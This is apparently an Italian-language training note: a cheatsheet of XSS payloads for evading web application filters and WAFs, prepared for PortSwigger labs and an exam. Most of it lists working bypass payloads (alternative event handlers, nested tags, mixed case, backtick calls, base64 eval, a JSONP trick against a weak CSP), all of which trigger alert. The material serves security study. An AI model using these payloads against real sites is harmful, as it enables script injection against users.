# WAF Evasion (XSS)

**Difficolta:** Advanced
**Time to Master:** 2h
**Prerequisiti:** [05-Encoding-Payloads.md](05-Encoding-Payloads.md)
**Lab:** PortSwigger Academy — XSS filter evasion

---

## Obiettivo

Raccolta sistematica di tecniche per bypassare filtri/WAF che bloccano tag, keyword o pattern noti di XSS. Sezione "cheatsheet puro" da scorrere in ordine durante l'esame.

---

## Concetti chiave

### Categorie di filtro comuni

| Filtro | Debolezza tipica |
|--------|--------------------|
| Blacklist su `<script>` | tag/handler alternativi passano |
| Rimozione tag una sola volta | tag annidati (`<scr<script>ipt>`) |
| Case-sensitive matching | maiuscole/minuscole miste |
| Blocca solo `onerror`/`onload` | decine di altri event handler esistono |

---

## Strumenti

Nessun tool dedicato: lista di payload da provare in sequenza con Burp Repeater/Intruder.

---

## Payload / Esempi

### Esempio 1: tag/handler alternativi a `<script>`

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### Esempio 2: bypass rimozione singola del tag (nesting)

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x one­rror=alert(1)>    -- carattere invisibile tra "on" ed "error" in alcuni filtri regex deboli
```

### Esempio 3: bypass case-sensitive

```html
<ScRiPt>alert(1)</sCriPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### Esempio 4: bypass tramite backtick invece di parentesi (evita filtro su `()`)

```html
<svg onload=alert`1`>
```

**Spiegazione:** i template literal JS (backtick) possono essere usati come argomento di funzione in alcuni contesti, bypassando filtri che bloccano solo la sequenza `alert(`.

### Esempio 5: bypass filtro su parole comuni ("alert", "script")

```html
<img src=x onerror="window['al'+'ert'](1)">
<img src=x onerror="top['al'+'ert'](1)">
<svg onload=eval(atob('YWxlcnQoMSk='))>
```

**Spiegazione:** costruire il nome della funzione a runtime concatenando stringhe, o codificare l'intero payload in base64 dentro `eval(atob())`, bypassa blacklist basate su pattern testuali statici.

### Esempio 6: bypass CSP debole (unsafe-inline assente ma script-src troppo permissivo)

```
Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net
```
Se un file JSONP o libreria ospitata sul dominio whitelisted permette callback arbitrarie:
```html
<script src="https://cdn.jsdelivr.net/npm/some-lib/jsonp?callback=alert(document.domain)//"></script>
```

---

## Evasion / Bypass Techniques

Questo intero file e la sezione evasion. **Regola pratica:** prova in ordine — tag/handler alternativo, poi case variation, poi nesting, poi encoding (vedi [05-Encoding-Payloads.md](05-Encoding-Payloads.md)), poi CSP bypass se applicabile.

---

## Lab Hands-On

### Lab 1: PortSwigger — Reflected XSS with some SVG markup allowed
**Obiettivo:** bypassare blacklist parziale su tag
**Difficulty:** Difficile
**Time:** 45 min

**Walkthrough breve:**
1. Identifica quali tag/attributi sono bloccati testando uno per uno
2. Usa un tag/handler non presente nella blacklist (es. SVG con evento raro)
3. Conferma esecuzione

---

## Common Mistakes

- Fermarsi al primo tag bloccato -> esistono decine di tag/handler alternativi, non solo script/img/svg
- Non controllare la CSP prima di dare per scontato che l'app sia protetta -> molte CSP hanno whitelist troppo ampie o mancano `object-src`/`base-uri`

---

## Link Utili

- [PortSwigger — XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadsAllTheThings — XSS filter bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

## Connessioni

- **Prerequisito:** [05-Encoding-Payloads.md](05-Encoding-Payloads.md)
- **Prossimo Step:** [07-Cookie-Stealing.md](07-Cookie-Stealing.md)

---

## Checklist di padronanza

- [ ] Conosco almeno 8 tag/event handler alternativi a script
- [ ] So bypassare filtri case-sensitive e a rimozione singola
- [ ] So valutare la robustezza di una CSP

---

## Note personali

_(spazio libero)_
